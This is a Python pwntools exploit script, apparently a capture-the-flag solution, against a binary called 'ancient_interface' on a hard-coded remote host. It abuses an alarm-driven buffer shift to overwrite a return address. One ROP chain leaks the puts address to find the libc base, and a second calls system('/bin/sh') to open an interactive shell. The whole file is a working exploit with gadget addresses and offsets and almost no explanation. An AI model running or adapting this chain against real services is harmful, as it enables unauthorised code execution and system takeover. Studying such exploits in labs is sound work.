#!/usr/bin/python3
from pwn import *
import time

exe = ELF("./ancient_interface", checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '59', '-I']
context.log_level   = "WARNING"
isDebug = False

# break *0x0000000000401876
# break *0x0000000000401A15
# break *0x000000000040101a
# break *0x0000000000401d43
# break *0x0000000000401B12
# break *0x0000000000401a1a
# break *0x0000000000401A38
# break *0x00000000004019A6
gs = '''
handle SIGALRM pass
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)

def extract_address(data):
	# Extract the address and remove any leading null bytes
	extracted_address = data[0:6]

	# Ensure the address is exactly 8 bytes long for u64
	extracted_address = extracted_address.ljust(8, b'\x00')

	extracted_address_int = u64(extracted_address)
	print(f"{hex(extracted_address_int)=}")

	libc_base = extracted_address_int - libc_puts_offset # puts
	return libc_base

def leak_libc(variableName: str = "libc") -> int:
	number_of_alerts = 40
	payload_size = (4 * 8)

	for i in range(number_of_alerts):
		cmd_alarm(15)   

	sleep(2)
	io.sendafter(b"user@host$ ", f"read {payload_size} {variableName}{number_of_alerts}".encode())

	payload = flat(
		bin_pop_rdi,
		exe.got['puts'],
		exe.plt['puts'],
		bin_main
	)

	# we wait for all the alerts to execute
	sleep_time = number_of_alerts - 15
	print(f"Sleeping for {sleep_time} seconds... waiting for alerts to trigger")
	sleep(sleep_time)

	# and we overwrite the return address from cmd_read !
	print("Sending payload to leak puts address")
	io.sendline(payload)

	io.recv(timeout=2)
	result = io.recv(timeout=3)

	address = extract_address(result)
	print(f"libc base: {hex(address)}   <-----------------")
	return address


def cmd_alarm(time: int = 10):
	io.sendlineafter(b"user@host$ ", f"alarm {time}".encode())


def exploit(variableName: str = "pwn"):
	print(f"Trying to pwn...")
	print("Shifting buffer 40 bytes backwards")
	number_of_alerts = 40
	payload_size = 8 * 4

	for i in range(number_of_alerts):
		time.sleep(0.3)
		cmd_alarm(30)   

	sleep(2)
	io.sendlineafter(b"user@host$ ", f"read {payload_size} {variableName}{number_of_alerts}".encode())

	payload = flat(
		bin_ret,  # we realign the stack to 16 bytes here with a ret; gadget
		bin_pop_rdi,
		libc_binsh,
		libc_system,
	)

	# we wait for all the alerts to execute
	sleep_time = number_of_alerts + 15
	print(f"Sleeping for {sleep_time} seconds... waiting for alerts to trigger")
	sleep(sleep_time)

	# and we overwrite the return address from cmd_read !
	print("Sending final payload. Good luck...")
	io.sendline(payload)


#===========================================================
#                    EXPLOIT GOES HERE                     #
#===========================================================

io = remote("188.166.175.58", 31853)
# io = start_local(isDebug)
io.timeout = 0.3

print("Leaking libc...")
sleep(1)
print("Setting 40 alarms to shift input buffer 40 bytes backwards")

bin_pop_rdi = 0x0000000000401d43 # pop rdi; ret;
bin_main = 0x0000000000401B16
bin_ret = 0x000000000040101a
bin_whoami = 0x0000000000401A85

libc_printf_offset = 0x61c90 
libc_puts_offset = 0x84420
libc_base = leak_libc()

libc_binsh = libc_base + 0x001b45bd
libc_system = libc_base + 0x00052290
libc_one_gadget = libc_base + 0xe3b01 # 0xe3afe 0xe3b01 0xe3b04

print(f"{hex(libc_binsh)=}")
print(f"{hex(libc_system)=}")

# sleep for a bit ... trying to sync times
sleep(2)
exploit()

print("Sleeping for 2 seconds... letting exploit work before interactive shell")
sleep(2)

print("Enjoy your shell.")
io.interactive()